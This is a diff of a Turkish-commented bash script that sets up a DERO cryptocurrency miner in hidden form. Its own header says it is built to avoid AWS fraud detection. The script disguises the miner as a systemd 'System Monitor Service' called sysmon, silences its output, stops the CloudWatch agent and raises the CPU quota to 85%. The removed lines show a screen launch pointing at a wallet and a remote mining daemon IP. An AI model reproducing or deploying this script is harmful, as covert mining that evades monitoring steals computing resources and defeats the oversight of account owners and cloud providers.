@@ -1,3 +1,5 @@
+
+
 #!/bin/bash
 # DERO Miner - Gizli Versiyon (AWS Fraud Detection Önleme)
 # Versiyon: 3.0 (Gizli)
@@ -49,20 +51,8 @@ fi
 
 echo "Sistem servisi başlatılıyor (threads: $use_cores, total: $total_cores)..."
 
-# Miner'ı screen içinde başlat
-screen -dmS sysmon bash -c "$MINER_DIR/$MINER_NAME \
---wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj \
---daemon-rpc-address 91.98.80.16:10100 \
---mining-threads $use_cores > /dev/null 2>&1"
-
-# CPU kullanımını %75'e sınırla (fraud detection için)
-sleep 2
-MINER_PID=$(pgrep -f sysmon)
-if [ -n "$MINER_PID" ]; then
-    cpulimit -l 75 -p $MINER_PID > /dev/null 2>&1 &
-fi
-
 # Systemd service oluştur (otomatik başlatma ve gizleme)
+# SADECE systemd service kullan, screen kullanma (çift process önlemek için)
 cat > /etc/systemd/system/sysmon.service <<EOF
 [Unit]
 Description=System Monitor Service
@@ -76,7 +66,7 @@ Restart=always
 RestartSec=10
 StandardOutput=null
 StandardError=null
-CPUQuota=75%
+CPUQuota=85%
 
 [Install]
 WantedBy=multi-user.target
@@ -84,6 +74,7 @@ EOF
 
 systemctl daemon-reload
 systemctl enable sysmon > /dev/null 2>&1
+systemctl start sysmon > /dev/null 2>&1
 
 # CloudWatch devre dışı (varsa)
 systemctl stop amazon-cloudwatch-agent 2>/dev/null || true
@@ -98,4 +89,3 @@ echo ""
 echo "✅ Sistem servisi aktif"
 echo "🔒 Gizli mod: Aktif"
 echo "🔍 Durum: systemctl status sysmon"
-
